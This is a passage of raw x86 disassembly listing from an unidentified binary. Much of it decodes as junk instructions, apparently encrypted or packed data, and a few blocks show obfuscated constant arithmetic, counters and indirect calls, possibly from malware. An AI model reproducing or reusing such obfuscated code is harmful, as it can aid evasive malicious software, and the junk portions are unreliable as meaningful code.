  4058f9:	call   0xfc9691bc
  4058fe:	cdq    
  4058ff:	xchg   ecx,eax
  405900:	stc    
  405901:	neg    BYTE PTR [di]
  405904:	sar    dl,cl
  405906:	xor    BYTE PTR [ecx-0xc],dl
  405909:	xor    DWORD PTR [ecx],0xffffffa7
  40590c:	inc    ecx
  40590d:	pop    eax
  40590e:	push   ebp
  40590f:	rol    DWORD PTR [ebp+0x7d],cl
  405912:	sub    al,0x32
  405914:	xor    esi,DWORD PTR [ebx+0x62]
  405917:	xchg   edi,eax
  405918:	or     bh,BYTE PTR [edi]
  40591a:	aam    0x41
  40591c:	inc    ebp
  40591d:	fwait
  40591e:	mov    ebx,0x66c54c9e
  405923:	outs   dx,DWORD PTR ds:[esi]
  405924:	js     0x405909
  405926:	mov    ch,0xfc
  405928:	mov    ds:0xce952bf6,eax
  40592d:	jns    0x40592d
  40592f:	push   ds
  405930:	xor    BYTE PTR fs:[edi+0x62],al
  405934:	mov    gs,WORD PTR [edx+0x3bccb04c]
  40593a:	jecxz  0x4058d1
  40593c:	mov    cl,BYTE PTR [ecx-0x62]
  40593f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405940:	push   esi
  405941:	dec    eax
  405942:	sub    BYTE PTR [esi-0x62],bl
  405945:	xor    dh,cl
  405947:	out    0xed,eax
  405949:	jo     0x40593b
  40594b:	popa   
  40594c:	mov    BYTE PTR [edi],bh
  40594e:	mov    ds:0xec472cf7,eax
  405953:	jb     0x40597a
  405955:	int    0x6c
  405957:	inc    edi
  405958:	pushf  
  405959:	xchg   ecx,eax
  40595a:	xor    bh,BYTE PTR ds:0xf8b6981b
  405960:	popf   
  405961:	out    0xc1,al
  405963:	pusha  
  405964:	arpl   WORD PTR ds:0xb74d586c,dx
  40596a:	push   esi
  40596b:	daa    
  40596c:	aaa    
  40596d:	xor    DWORD PTR [esi+0x6b],ecx
  405970:	repz (bad)
  405973:	popf   
  405974:	jae    0x40595b
  405976:	mov    cl,0xf6
  405978:	test   al,0x93
  40597a:	retf   
  40597b:	xor    bl,dh
  40597d:	sub    dl,ah
  40597f:	(bad)  
  405980:	popf   
  405981:	pop    esp
  405982:	jmp    0x79b95d84
  405987:	(bad)  
  405988:	nop
  405989:	scas   eax,DWORD PTR es:[edi]
  40598a:	mov    DWORD PTR [edx-0x1acbe050],edx
  405990:	je     0x405a0e
  405992:	fistp  QWORD PTR [ebx-0x4f]
  405995:	fisttp QWORD PTR [edx]
  405997:	in     eax,0x32
  405999:	nop
  40599a:	sub    DWORD PTR [edx],ecx
  40599c:	mov    ebp,0xaae0a47
  4059a1:	sub    eax,0x5dff0595
  4059a6:	test   BYTE PTR [eax],0x46
  4059a9:	retf   
  4059aa:	ss xchg esp,eax
  4059ac:	pop    esi
  4059ad:	sbb    ah,BYTE PTR [eax+ebp*1-0x12]
  4059b1:	call   0x6406:0x5109dfce
  4059b8:	sbb    BYTE PTR [ebx-0x38],ch
  4059bb:	mov    al,0x1d
  4059bd:	imul   BYTE PTR [ebp+ebp*4-0x4859d519]
  4059c4:	std    
  4059c5:	xchg   ebp,eax
  4059c6:	(bad)  
  4059c7:	and    cl,BYTE PTR [ebp+0x1a]
  4059ca:	jmp    0x405993
  4059cc:	inc    edx
  4059cd:	inc    edx
  4059ce:	(bad)  
  4059cf:	mov    ebx,0x8b8170c8
  4059d4:	retf   0xe20a
  4059d7:	mov    al,cl
  4059d9:	sahf   
  4059da:	cmc    
  4059db:	mov    ah,0xf7
  4059dd:	xor    DWORD PTR [ebx],ebx
  4059df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059e0:	fwait
  4059e1:	mov    esi,0x1af7eb2e
  4059e6:	pop    ebp
  4059e7:	sahf   
  4059e8:	mov    ebp,0x9f057c95
  4059ed:	mov    cl,0xae
  4059ef:	inc    edi
  4059f0:	clc    
  4059f1:	xchg   BYTE PTR [eax+0x7],dh
  4059f4:	iret   
  4059f5:	inc    ebp
  4059f6:	dec    edi
  4059f7:	repz mov ch,0xc9
  4059fa:	sub    edi,DWORD PTR [ebp+ebp*2-0x71ca138b]
  405a01:	dec    edi
  405a02:	jecxz  0x405a70
  405a04:	push   esp
  405a05:	or     BYTE PTR [ecx-0x6dac51e3],cl
  405a0b:	mov    bp,WORD PTR [esi+0xc0e4dc6]
  405a12:	je     0x4059b1
  405a14:	icebp  
  405a15:	lea    esp,[esp+eiz*8-0x73]
  405a19:	aas    
  405a1a:	mov    ds:0x3a214a88,al
  405a1f:	in     eax,0x2e
  405a21:	ins    DWORD PTR es:[edi],dx
  405a22:	dec    esi
  405a23:	mov    ch,0x94
  405a25:	hlt    
  405a26:	pop    edx
  405a27:	popa   
  405a28:	sbb    al,al
  405a2a:	not    BYTE PTR [eax+0x740ae10e]
  405a30:	rdtsc  
  405a32:	fidivr DWORD PTR [ebx]
  405a34:	loop   0x405a95
  405a36:	mov    BYTE PTR [ebx+0x4bbe2251],ah
  405a3c:	retf   
  405a3d:	loope  0x405a7f
  405a3f:	add    BYTE PTR [eax],ch
  405a41:	pop    ecx
  405a42:	popa   
  405a43:	aad    0x33
  405a45:	test   BYTE PTR [ebx+0x19],0x36
  405a49:	xchg   dh,dh
  405a4b:	or     DWORD PTR ds:0xc780ea15,ebx
  405a51:	inc    ebp
  405a52:	clc    
  405a53:	xor    DWORD PTR [ebp-0x1d7e0764],eax
  405a59:	jnp    0x405ad4
  405a5b:	add    BYTE PTR [eax],al
  405a5d:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  405a64:	and    edx,edx
  405a66:	mov    eax,DWORD PTR [ebp-0x4]
  405a69:	sbb    ecx,DWORD PTR ds:0x42fd05
  405a6f:	push   esi
  405a70:	mov    esi,DWORD PTR [ebp-0x8]
  405a73:	and    DWORD PTR ds:0x42fcf1,0x0
  405a7d:	jmp    0x405a8f
  405a82:	mov    edx,DWORD PTR ds:0x42fcf1
  405a88:	inc    edx
  405a89:	mov    DWORD PTR ds:0x42fcf1,edx
  405a8f:	cmp    DWORD PTR ds:0x42fcf1,0x17
  405a96:	jae    0x405b0b
  405a9c:	cmp    DWORD PTR ds:0x42fcf1,0x1d
  405aa3:	jne    0x405ab5
  405aa9:	push   DWORD PTR [ebp-0x24]
  405aac:	push   DWORD PTR [ebp-0x20]
  405aaf:	call   DWORD PTR ds:0x42e2db
  405ab5:	jmp    0x405a82
  405aba:	mov    DWORD PTR ds:0x42fcd9,0x14
  405ac4:	cmp    DWORD PTR ds:0x42fcd9,0x0
  405acb:	je     0x405b0b
  405ad1:	cmp    DWORD PTR ds:0x42fcd9,0x16
  405ad8:	jne    0x405af7
  405ade:	push   DWORD PTR [ebp-0x14]
  405ae1:	push   0x2e3f
  405ae6:	push   DWORD PTR [ebp-0x18]
  405ae9:	push   DWORD PTR [ebp-0x18]
  405aec:	push   0x8cdb
  405af1:	call   DWORD PTR ds:0x42e537
  405af7:	xor    edx,edx
  405af9:	xor    edx,DWORD PTR ds:0x42fcd9
  405aff:	dec    edx
  405b00:	mov    DWORD PTR ds:0x42fcd9,edx
  405b06:	jmp    0x405ac4
  405b0b:	mov    edx,0x7510855
  405b10:	add    DWORD PTR ds:0x42fcd1,edi
  405b16:	xor    eax,edx
  405b18:	and    DWORD PTR ds:0x42e6f7,ebx
  405b1e:	xor    esi,edx
  405b20:	mov    ecx,0x32729c
  405b25:	add    esi,ecx
  405b27:	add    eax,ecx
  405b29:	imul   eax,esi
  405b2c:	mov    esi,DWORD PTR [ebp+0xc]
  405b2f:	cmp    esi,eax
  405b31:	jne    0x405b4d
  405b37:	mov    eax,DWORD PTR [ebp-0x4]
  405b3a:	mov    esi,DWORD PTR [ebp-0x8]
  405b3d:	xor    eax,edx
  405b3f:	xor    esi,edx
  405b41:	add    eax,ecx
  405b43:	add    esi,ecx
  405b45:	imul   eax,esi
  405b48:	jmp    0x405e5b
  405b4d:	mov    eax,DWORD PTR [ebp+0xc]
  405b50:	mov    eax,DWORD PTR [eax+0x78]
  405b53:	mov    DWORD PTR [ebp+0xc],eax
  405b56:	mov    eax,DWORD PTR [ebp-0x4]
  405b59:	mov    esi,DWORD PTR [ebp-0x8]
  405b5c:	xor    eax,edx
  405b5e:	xor    esi,edx
  405b60:	add    eax,ecx
  405b62:	add    esi,ecx
  405b64:	imul   eax,esi
  405b67:	mov    esi,DWORD PTR [ebp+0xc]
  405b6a:	cmp    esi,eax
  405b6c:	mov    eax,DWORD PTR [ebp-0x4]
  405b6f:	je     0x405b3a
  405b75:	jmp    0x405e48
  405b7a:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  405b80:	imul   esi,DWORD PTR gs:[eax+0x3],0xc411624d
  405b88:	push   0x703284f1
  405b8d:	jo     0x405b39
  405b8f:	jle    0x405c01
  405b91:	jo     0x405b4a
  405b93:	xchg   ecx,eax
  405b94:	nop
  405b95:	mov    ah,0x13
  405b97:	cmp    bl,BYTE PTR [esi]
  405b99:	jbe    0x405bc2
  405b9b:	mov    esp,0x461397a6
  405ba0:	xchg   esi,eax
  405ba1:	sub    eax,0x19f1c7c3
  405ba6:	ins    DWORD PTR es:[edi],dx
  405ba7:	xchg   edx,eax
  405ba8:	pop    DWORD PTR [eax+ecx*2-0x7144c33c]
  405baf:	popf   
  405bb0:	js     0x405b5a
  405bb2:	or     eax,0x3f56197
  405bb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bb8:	jp     0x405b8f
  405bba:	test   DWORD PTR [ebx-0x3aba7b28],esp
  405bc0:	push   ebp
  405bc1:	xchg   DWORD PTR es:[edi+0xcf40549],edi
  405bc8:	(bad)  
  405bc9:	cmp    DWORD PTR [edx],ecx
  405bcb:	test   BYTE PTR [eax+0x7f],bl
  405bce:	xchg   ebp,eax
  405bcf:	push   0x2a
  405bd1:	dec    ecx
  405bd2:	mov    DWORD PTR [ebp+0x11dfeb89],eax
  405bd8:	sub    ebx,DWORD PTR [ecx]
  405bda:	cli    
  405bdb:	mov    ecx,0x86096e44
  405be0:	dec    edx
  405be1:	cmp    BYTE PTR [ebx+0x65],0x18
  405be5:	sbb    DWORD PTR [ecx-0x7599e5b4],0x3f
  405bec:	ins    DWORD PTR es:[edi],dx
  405bed:	mov    ecx,0xaafe9824
  405bf2:	or     bh,ch
  405bf4:	lods   al,BYTE PTR ds:[esi]
  405bf5:	xchg   edx,eax
  405bf6:	les    eax,FWORD PTR [eax-0x29]
  405bf9:	push   ss
  405bfa:	mov    ds,eax
  405bfc:	fld    TBYTE PTR ds:0x5158a9bd
  405c02:	rcl    BYTE PTR [ecx],1
  405c04:	push   esp
  405c05:	push   es
  405c06:	cli    
  405c07:	dec    edi
  405c08:	test   ebp,esi
  405c0a:	les    eax,FWORD PTR [eax]
  405c0c:	ds inc ebx
  405c0e:	mov    al,ds:0x2a3a23cf
  405c13:	in     eax,0x5f
  405c15:	enter  0x5519,0xbf
  405c19:	add    esi,DWORD PTR [edx-0x48234290]
  405c1f:	mov    bh,0x1f
  405c21:	scas   al,BYTE PTR es:[edi]
  405c22:	ret    0xd58f
  405c25:	es jns 0x405c64
  405c28:	mov    ds:0x2267ddf0,eax
  405c2d:	rcl    DWORD PTR [esi-0xa],1
  405c30:	lods   eax,DWORD PTR ds:[esi]
  405c31:	xlat   BYTE PTR ds:[ebx]
  405c32:	lods   eax,DWORD PTR ds:[esi]
  405c33:	cs dec edi
  405c35:	inc    edx
  405c36:	sub    dh,BYTE PTR [esi+0x60b876f3]
  405c3c:	push   0xffffffae
  405c3e:	jno    0x405ca6
  405c40:	push   ds
  405c41:	mov    ebx,0x4e80489e
  405c46:	xchg   ebx,eax
  405c47:	or     DWORD PTR [eax],eax
  405c49:	xlat   BYTE PTR ds:[ebx]
  405c4a:	sub    eax,0x34dd3bac
  405c4f:	int    0x4d
  405c51:	and    al,0xec
  405c53:	sbb    eax,0x863ca468
  405c58:	and    DWORD PTR [eax],edx
  405c5a:	(bad)  
  405c5c:	fdivp  st(2),st
  405c5e:	mov    dl,0xea
  405c60:	loop   0x405c4a
  405c62:	inc    edi
  405c63:	xchg   esp,eax
  405c64:	popa   
  405c65:	or     DWORD PTR [eax+0x5d],ebp
  405c68:	lea    ebx,[ebp-0x44]
  405c6b:	aam    0xbd
  405c6d:	inc    ecx
  405c6e:	adc    cl,BYTE PTR [ebx+0x77]
  405c71:	cmp    DWORD PTR [ebx],eax
  405c73:	sub    esp,DWORD PTR [edx]
  405c75:	dec    esp
  405c76:	pop    ds
  405c77:	sub    ebp,DWORD PTR [edx+0x15]
  405c7a:	repz or cl,ah
  405c7d:	ja     0x405c25
  405c7f:	and    esp,DWORD PTR [ebp+0x4396bf2d]
  405c85:	not    BYTE PTR [edx]
  405c87:	mov    ecx,0x268343ce
  405c8c:	xor    edx,esp
  405c8e:	dec    edi
  405c8f:	arpl   WORD PTR [eax],cx
  405c91:	mov    cl,0xcc
  405c93:	in     eax,dx
  405c94:	mov    ch,0xe4
  405c96:	lods   eax,DWORD PTR ds:[esi]
  405c97:	sub    eax,0xa46a7af7
  405c9c:	jno    0x405d05
  405c9e:	ss inc esp
  405ca0:	add    al,BYTE PTR [edx-0x56e7a338]
  405ca6:	and    DWORD PTR [edx],ebx
  405ca8:	nop
  405ca9:	inc    edi
  405caa:	mov    BYTE PTR [ebx+0xbd9a058],ch
  405cb0:	jl     0x405d22
  405cb2:	das    
  405cb3:	(bad)
  405cb6:	mov    ch,0x93
  405cb8:	sub    eax,0x67e54c29
  405cbd:	dec    esi
  405cbe:	inc    ebp
  405cbf:	adc    al,0x3f
  405cc1:	es mov ch,0xb1
  405cc4:	int    0xec
  405cc6:	mov    ah,0xa
  405cc8:	gs xor eax,0xd076da83
  405cce:	add    ebx,eax
  405cd0:	inc    ebx
  405cd1:	xchg   ebp,eax
  405cd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cd3:	rcr    BYTE PTR [ebx],1
  405cd5:	jecxz  0x405ca0
  405cd7:	daa    
  405cd8:	cmp    al,0x91
  405cda:	mov    ah,0xba
  405cdc:	pushf  
  405cdd:	jo     0x405c99
  405cdf:	pop    ebx
  405ce0:	push   eax
  405ce1:	inc    ebx
  405ce2:	pushf  
  405ce3:	dec    eax
  405ce4:	and    eax,0x1fe2049f
  405ce9:	(bad)  
  405cea:	mov    ch,0xaa
  405cec:	ficom  DWORD PTR [ecx+eax*2-0x63]
  405cf0:	sti    
  405cf1:	ret    
  405cf2:	dec    edi
  405cf3:	test   bl,dh
  405cf5:	fcmovb st,st(0)
  405cf7:	jecxz  0x405ced
  405cf9:	data16 outs dx,BYTE PTR ds:[esi]
  405cfb:	gs push ebp
  405cfd:	mov    edx,0xe4f685bc
  405d02:	mov    edx,0x24909f0
  405d07:	or     ebp,esp
  405d09:	in     eax,dx
  405d0a:	dec    edx
  405d0b:	cvtps2pd xmm3,QWORD PTR [eax-0x60]
  405d0f:	jb     0x405cc7
  405d11:	pop    ds
  405d12:	inc    edi
  405d13:	(bad)  
  405d14:	repnz arpl WORD PTR [edx-0x2fb792de],sp
  405d1b:	adc    DWORD PTR [eax-0x1983d0fc],0xe456e4b6
  405d25:	clc    
  405d26:	retf   
  405d27:	jne    0x405d41
  405d29:	dec    esp
  405d2a:	jne    0x405ce1
  405d2c:	lods   eax,DWORD PTR ds:[esi]
  405d2d:	and    BYTE PTR [edx+0x6c],al
  405d30:	out    dx,al
  405d31:	inc    esi
  405d32:	scas   al,BYTE PTR es:[edi]
  405d33:	dec    ebx
  405d34:	outs   dx,BYTE PTR ds:[esi]
  405d35:	popa   
  405d36:	stos   BYTE PTR es:[edi],al
  405d37:	xor    DWORD PTR [ecx+0x781e8b3e],edx
  405d3d:	cmp    dh,BYTE PTR [esi+0x7d]
  405d40:	mov    ebp,DWORD PTR [edx]
  405d42:	in     eax,dx
  405d43:	out    0x68,al
  405d45:	mov    ds:0x4e336c6b,eax
  405d4a:	cmp    dh,BYTE PTR ds:0xb1cce9ca
  405d50:	xchg   edx,eax
  405d51:	outs   dx,DWORD PTR ds:[esi]
  405d52:	mov    cs,WORD PTR ds:0x507efc71
  405d58:	lock test DWORD PTR [eax],0x942981b5
  405d5f:	mov    al,ds:0xc3df8bab
  405d64:	mov    ebp,0xa84655e2
  405d69:	fsubr  QWORD PTR [eax-0x26fefeed]
  405d6f:	ret    0x2093
  405d72:	inc    ebp
  405d73:	jbe    0x405d11
  405d75:	shl    DWORD PTR [eax-0x4a],1
  405d78:	jp     0x405d85
  405d7a:	loope  0x405de8
  405d7c:	nop
  405d7d:	inc    edx
  405d7e:	test   DWORD PTR [edx+0x76],0x5076397d
  405d85:	mov    ds:0xe58aa5cc,al
  405d8a:	(bad)  
  405d8b:	mov    dh,0x41
  405d8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d8e:	jns    0x405db3
  405d90:	bound  edx,QWORD PTR [ecx]
  405d92:	jns    0x405d51
  405d94:	std    
  405d95:	pop    ds
  405d96:	lods   eax,DWORD PTR ds:[esi]
  405d97:	mov    dh,0xcd
  405d99:	jle    0x405e09
  405d9b:	sbb    al,0x6b
  405d9d:	and    al,0x88
  405d9f:	mov    edx,0x3db64f4e
  405da4:	aam    0xe
  405da6:	pop    ss
  405da7:	sbb    dh,BYTE PTR ds:0xf9aefcee
  405dad:	mov    ah,ch
  405daf:	add    bl,BYTE PTR [ebp-0x28fbeb93]
  405db5:	push   esp
  405db6:	ror    BYTE PTR [ebx],0x86
  405db9:	out    0x62,eax
  405dbb:	or     eax,0xc0df52a9
  405dc0:	fimul  WORD PTR [esp+esi*1+0x4e]
  405dc4:	adc    ecx,esp
  405dc6:	daa    
  405dc7:	cmp    eax,DWORD PTR [ebx+ecx*4+0x17]
  405dcb:	and    BYTE PTR [edi-0x2],0xb5
  405dcf:	add    al,0xe2
  405dd1:	jge    0x405e21
  405dd3:	inc    edx
  405dd4:	scas   eax,DWORD PTR es:[edi]
  405dd5:	int    0x0
  405dd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405dd8:	xchg   esp,eax
  405dd9:	push   ds
  405dda:	xchg   esi,eax
  405ddb:	mov    ds:0xa2eb9ccd,al
  405de0:	frstor ss:[esi-0x6d973a6e]
  405de7:	ficomp DWORD PTR [ebx+edi*1-0x59]
  405deb:	ja     0x405de5
  405ded:	sub    eax,0x3681e439
  405df2:	or     BYTE PTR [esi-0x77b82f7f],al
  405df8:	mov    al,ds:0xefd7a8c8
  405dfd:	inc    ecx
  405dfe:	sahf   
  405dff:	and    al,0xe9
  405e01:	and    DWORD PTR [ecx+0x5e85f73f],esi
  405e07:	fldcw  WORD PTR [edx+0x15022005]
  405e0d:	ja     0x405e03
  405e0f:	cmp    eax,0xfb84cb82
  405e14:	dec    ebp
  405e15:	jo     0x405dfc
  405e17:	xchg   edi,eax
  405e18:	dec    edi
  405e19:	test   DWORD PTR [esi*4+0x4b4bf249],esi
  405e20:	xor    DWORD PTR [esi+0x53f835fa],edx
  405e26:	mov    gs,esp
  405e28:	dec    edx
  405e29:	lea    ecx,[ecx-0x49]
  405e2c:	nop
  405e2d:	loope  0x405e4c
  405e2f:	and    DWORD PTR [esi],ecx
  405e31:	xchg   BYTE PTR ds:0xa3d6eeb2,al
  405e37:	repz cmp eax,0x55a01177
  405e3d:	pusha  
  405e3e:	pop    esp
  405e3f:	in     eax,0xe1
  405e41:	call   0x975d1e52
  405e46:	nop
  405e47:	jg     0x405e7c
  405e49:	ret    0xc103
  405e4c:	mov    ecx,DWORD PTR [ebp+0xc]
  405e4f:	imul   eax,ecx
  405e52:	add    eax,DWORD PTR [ebp+0x8]
  405e55:	mov    DWORD PTR [ebp+0xc],eax
  405e58:	mov    eax,DWORD PTR [ebp+0xc]
  405e5b:	pop    esi
  405e5c:	leave  
  405e5d:	ret    0x8
  405e60:	push   ebp
  405e61:	mov    ebp,esp
  405e63:	push   ecx
  405e64:	add    DWORD PTR ds:0x42e70f,0x1508
  405e6e:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405e75:	mov    eax,DWORD PTR [ebp-0x4]
  405e78:	mov    edx,DWORD PTR [ebp+0x10]
  405e7b:	adc    DWORD PTR ds:0x42e6ef,0x4006
  405e85:	mov    ecx,0x7510855
  405e8a:	xor    DWORD PTR ds:0x42fd01,0x260
  405e94:	xor    eax,ecx
  405e96:	jmp    0x40605c
  405e9b:	fidiv  DWORD PTR [edx+0x7b]
  405e9e:	jle    0x405e33
  405ea0:	jne    0x405e7b
  405ea2:	jb     0x405e2d
  405ea4:	(bad)  
  405ea5:	(bad)  
  405ea6:	sub    al,0xcd
  405ea8:	sahf   
  405ea9:	adc    DWORD PTR [eax],edx
  405eab:	ds aas 
  405ead:	jo     0x405f1f
  405eaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405eb0:	jg     0x405f22
  405eb2:	jo     0x405e40
  405eb4:	adc    DWORD PTR [eax+0x4310164b],edi
  405eba:	in     eax,dx
  405ebb:	pusha  
  405ebc:	add    DWORD PTR [edx+0x7837e1f4],esi
  405ec2:	retf   
  405ec3:	mov    ds:0x603847c6,al
  405ec8:	sti    
  405ec9:	sbb    ecx,ebx
  405ecb:	mov    al,ds:0xd1e36134
  405ed0:	sub    eax,0xa5b8c7c0
  405ed5:	sbb    eax,0x9f0f0f79
  405eda:	pop    es
  405edb:	or     eax,0x3e037ab5
  405ee0:	mov    al,0xf8
  405ee2:	es leave 
  405ee4:	cvttps2pi mm3,xmm0
  405ee7:	inc    ebx
  405ee8:	sysexit 
  405eea:	sub    BYTE PTR [edx],dl
  405eec:	pop    ds
  405eed:	or     ecx,DWORD PTR [ebx]
  405eef:	mov    DWORD PTR [edi-0x707ff189],ecx
  405ef5:	and    esp,eax
  405ef7:	mov    bl,0xd6
  405ef9:	inc    ebx
  405efa:	in     al,dx
  405efb:	mov    ch,0xbd
  405efd:	into   
  405efe:	je     0x405f19
  405f00:	mov    ebp,0x70d175b4
  405f05:	fld    TBYTE PTR [ebx-0x411c8ed]
  405f0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f0c:	lea    ebx,[esi]
  405f0e:	xlat   BYTE PTR ds:[ebx]
  405f0f:	xor    eax,0xf4d87c18
  405f14:	lods   al,BYTE PTR ds:[esi]
  405f15:	sahf   
  405f16:	jge    0x405f07
  405f18:	mov    WORD PTR [eax-0x2f],ds
  405f1b:	sbb    DWORD PTR [eax+ebx*1+0x52],edx
  405f1f:	or     eax,0x7d03f086
  405f24:	adc    eax,0x132b6e0b
  405f29:	pop    edx
  405f2a:	enter  0x34db,0x67
  405f2e:	mov    cl,BYTE PTR [ecx]
  405f30:	lods   eax,DWORD PTR ds:[esi]
  405f31:	cmp    edx,DWORD PTR [esp+edi*2]
  405f34:	inc    ecx
  405f35:	push   0xfffffff4
  405f37:	test   DWORD PTR [ecx+0x797142e2],esp
  405f3d:	pop    edi
  405f3e:	pop    esp
  405f3f:	dec    edi
  405f40:	adc    DWORD PTR [edx],ecx
  405f42:	xor    bl,BYTE PTR [ebx-0x7a88e8d2]
  405f48:	pop    ebx
  405f49:	jmp    0x405f95
  405f4b:	daa    
  405f4c:	add    al,0x4d
  405f4e:	dec    edi
  405f4f:	mov    esp,0xfcfbc4bb
  405f54:	rcl    DWORD PTR [esi+0x20],0xdd
  405f58:	pop    ds
  405f59:	jl     0x405fcd
  405f5b:	inc    ecx
  405f5c:	pop    ebx
  405f5d:	(bad)  
  405f5e:	aas    
  405f5f:	dec    edx
  405f60:	and    al,0x77
  405f62:	cdq    
  405f63:	iret   
  405f64:	shr    DWORD PTR [ebx],1
  405f66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f67:	dec    esp
  405f68:	adc    DWORD PTR [eax],edi
  405f6a:	imul   edx,esi,0xffffffd2
  405f6d:	xor    ch,BYTE PTR [edx+0x4b]
  405f70:	inc    esi
  405f71:	xor    DWORD PTR [ebp-0xa],ebp
  405f74:	adc    eax,0x6bb924a
  405f79:	ins    DWORD PTR es:[edi],dx
  405f7a:	out    0x73,al
  405f7c:	retf   0x56a3
  405f7f:	jne    0x405f3c
  405f81:	push   ecx
  405f82:	iret   
  405f83:	add    esp,edi
  405f85:	stos   DWORD PTR es:[edi],eax
  405f86:	xchg   BYTE PTR [eax],cl
  405f88:	mov    ebx,0xd6e394d4
  405f8d:	lods   al,BYTE PTR ds:[esi]
  405f8e:	shr    edx,cl
  405f90:	mov    ch,0x4f
  405f92:	xchg   BYTE PTR [ebx+0x40377de7],bh
  405f98:	popf   
  405f99:	aad    0x3d
  405f9b:	sbb    eax,0x578fded6
  405fa0:	pop    es
  405fa1:	sub    al,0x12
  405fa3:	les    ebp,FWORD PTR [edi+0x64]
  405fa6:	and    DWORD PTR [edx-0x56cd1f82],ebx
  405fac:	add    DWORD PTR [edi-0x6c],ebx
  405faf:	lods   al,BYTE PTR ds:[esi]
  405fb0:	mov    ebp,0x32acbe10
  405fb5:	adc    al,0xa2
  405fb7:	jmp    0xe6b5a6b
  405fbc:	cmp    edi,ebx
  405fbe:	mov    eax,0x647b3744
  405fc3:	fdiv   QWORD PTR [edx+0x7e8f9f3e]
  405fc9:	into   
  405fca:	xor    BYTE PTR [ecx],dh
  405fcc:	outs   dx,BYTE PTR ds:[esi]
  405fcd:	sbb    DWORD PTR ds:0x3bcbfbe3,eax
  405fd3:	pop    ss
  405fd4:	(bad)  [esi-0x75]
  405fd7:	leave  
  405fd8:	add    al,BYTE PTR [ebx+0x23]
  405fdb:	jle    0x406007
  405fdd:	push   edx
  405fde:	aas    
  405fdf:	push   ebx
  405fe0:	push   cs
  405fe1:	minps  xmm5,XMMWORD PTR [edi+esi*8+0x5296820a]
  405fe9:	sub    esp,DWORD PTR [ebx+eax*8+0x2e]
  405fed:	pop    esp
  405fee:	cmp    DWORD PTR [eax-0x10],ebp
  405ff1:	push   ds
  405ff2:	test   eax,0x3b1592ec
  405ff7:	sbb    DWORD PTR [ebp+0x583cb0fe],edx
  405ffd:	add    eax,0x5370700
  406002:	lods   al,BYTE PTR ds:[esi]
  406003:	adc    BYTE PTR [edx+0x3b],0x8e
  406007:	ins    DWORD PTR es:[edi],dx
  406008:	dec    ebx
  406009:	inc    ecx
  40600a:	ss inc ebx
  40600c:	adc    bl,BYTE PTR [edi-0x1e]
  40600f:	(bad)  
  406011:	test   DWORD PTR [edx-0x3dbfe654],esi
  406017:	cmp    BYTE PTR [edi-0x6c],0x38
  40601b:	or     DWORD PTR [ecx+0x36baa6b1],ebp
  406021:	scas   al,BYTE PTR es:[edi]
  406022:	xchg   ecx,eax
  406023:	sbb    al,0x51
  406025:	cli    
  406026:	outs   dx,BYTE PTR ds:[esi]
  406027:	adc    eax,0xd68528d6
  40602c:	inc    esi
  40602d:	sub    dl,BYTE PTR [ebp-0xb62137]
  406033:	xchg   ebp,eax
  406034:	inc    esi
  406035:	mov    WORD PTR [edi+0x5b],?
  406038:	push   0x50
  40603a:	mov    al,0x4
  40603c:	mov    ebx,0x9d71271f
  406041:	adc    ah,bh
  406043:	xchg   edi,eax
  406044:	les    esp,FWORD PTR [esi-0x75]
  406047:	cmc    
  406048:	pop    es
  406049:	sar    DWORD PTR [ecx],1
  40604b:	ins    DWORD PTR es:[edi],dx
  40604c:	pop    ecx
  40604d:	test   DWORD PTR [edx],edi
  40604f:	jnp    0x405fe7
  406051:	sbb    DWORD PTR [ebx+0x4c0778b0],eax
  406057:	or     BYTE PTR [ecx],bl
  406059:	mov    al,ds:0x9c0530a1
  40605e:	jb     0x406092
  406060:	add    BYTE PTR [ecx+0x42fd860d],al
  406066:	add    ah,ah
  406068:	or     al,BYTE PTR [eax]
  40606a:	add    BYTE PTR [ecx+0xc458b02],cl
  406070:	xor    eax,ecx
  406072:	push   esi
  406073:	sbb    edx,DWORD PTR ds:0x42e118
  406079:	mov    esi,DWORD PTR [ebp+0x10]
  40607c:	or     DWORD PTR ds:0x42fd76,edx
  406082:	mov    edx,0x32729c
  406087:	sbb    DWORD PTR ds:0x42fcf1,0x42e11c
  406091:	add    eax,edx
  406093:	adc    DWORD PTR ds:0x42fcd1,0x42e6fb
  40609d:	mov    DWORD PTR [esi+0x4],eax
  4060a0:	sbb    eax,0x6979
  4060a5:	mov    eax,DWORD PTR [ebp+0x14]
  4060a8:	adc    DWORD PTR ds:0x42fd82,0x2335
  4060b2:	mov    esi,DWORD PTR [ebp+0x10]
  4060b5:	sub    DWORD PTR ds:0x42fcd5,0x1c02
  4060bf:	mov    DWORD PTR [esi+0x8],eax
  4060c2:	or     eax,DWORD PTR ds:0x42fd05
  4060c8:	jmp    0x40628e
  4060cd:	out    dx,al
  4060ce:	hlt    
  4060cf:	arpl   WORD PTR [edx],dx
  4060d1:	popa   
  4060d2:	xchg   ecx,eax
  4060d3:	ins    DWORD PTR es:[edi],dx
  4060d4:	hlt    
  4060d5:	(bad)  
  4060d6:	pop    esp
  4060d7:	xor    eax,0xfec0896
  4060dc:	push   ebx
  4060dd:	gs ds jo 0x406151
  4060e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060e2:	jg     0x406154
  4060e4:	jo     0x40611b
  4060e6:	fldcw  WORD PTR [ebp-0x39]
  4060e9:	inc    ebx
  4060ea:	int3   
  4060eb:	lock out 0x3c,al
  4060ee:	fwait
  4060ef:	in     eax,0x91
  4060f1:	xchg   BYTE PTR [ecx],dl
  4060f3:	cmp    DWORD PTR [ebx+esi*8-0x44d38df1],0xffffffc2
  4060fb:	sti    
  4060fc:	addr16 leave 
  4060fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060ff:	push   edx
  406100:	js     0x4060d4
  406102:	mov    BYTE PTR [esi+0x41],cl
